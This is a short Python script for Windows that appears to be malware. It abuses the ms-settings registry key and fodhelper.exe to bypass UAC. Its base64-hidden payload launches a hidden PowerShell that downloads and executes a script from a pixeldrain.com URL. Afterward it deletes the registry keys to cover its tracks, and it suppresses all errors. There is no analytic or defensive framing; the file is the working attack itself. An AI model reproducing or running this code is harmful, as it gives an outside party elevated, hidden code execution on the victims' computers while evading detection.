import winreg as __w
import subprocess as __s
import time as __t
import base64

def __drop_shadow(cmd):
    try:
        key = __w.CreateKey(__w.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
        __w.SetValueEx(key, None, 0, __w.REG_SZ, cmd)
        __w.SetValueEx(key, "DelegateExecute", 0, __w.REG_SZ, "")
        __w.CloseKey(key)
    except:
        pass

def __clean_trace():
    for path in [
        r"Software\Classes\ms-settings\shell\open\command",
        r"Software\Classes\ms-settings\shell\open",
        r"Software\Classes\ms-settings"
    ]:
        try:
            __w.DeleteKey(__w.HKEY_CURRENT_USER, path)
        except:
            pass

def __ignite():
    encoded = b'bXNodGEgdmJzY3JpcHQ6RXhlY3V0ZSgiQ3JlYXRlT2JqZWN0KCIiV3NjcmlwdC5TaGVsbCIiKS5SdW4gIiIicG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyBJRVgobmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9waXhlbGRyYWluLmNvbS9hcGkvZmlsZS9XOUd2WEVoRT9kb3dubG9hZCcpIiIiOmNsb3NlIik='
    pl = base64.b64decode(encoded).decode('utf-8')
    __drop_shadow(pl)
    try:
        __s.Popen(["fodhelper.exe"], shell=False)
    except:
        pass
    __t.sleep(3)
    __clean_trace()

if __name__ == "__main__":
    __ignite()
